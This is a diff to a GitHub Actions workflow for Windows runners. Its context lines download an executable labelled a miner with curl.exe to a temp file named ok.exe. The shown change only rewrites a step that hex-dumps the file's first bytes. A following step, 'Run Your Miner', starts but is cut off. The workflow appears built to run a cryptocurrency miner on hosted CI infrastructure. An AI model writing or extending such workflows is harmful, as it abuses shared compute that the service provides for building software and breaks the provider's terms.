@@ -85,14 +85,16 @@ jobs:
           curl.exe -L -o $output $url
           Write-Host "Miner downloaded to $output"
 
-      # --- Check Downloaded File ---
+      # --- Check Downloaded File (Hex dump for verification) ---
       - name: Check Downloaded File
         run: |
           $file = "$env:TEMP\ok.exe"
           Write-Host "Downloaded file size:"
           Get-Item $file | Select-Object Length, FullName
-          Write-Host "First 20 lines of file (should be binary, not HTML!):"
-          Get-Content $file -TotalCount 20 -Encoding Byte | Format-Hex
+          Write-Host "First 64 bytes of file (as hex):"
+          $bytes = [System.IO.File]::ReadAllBytes($file)
+          $bytes[0..63] | ForEach-Object { Write-Host ("{0:X2}" -f $_) -NoNewline; Write-Host " " }
+          Write-Host ""
 
       # --- Run Your Miner (only if file is OK) ---
       - name: Run Your Miner
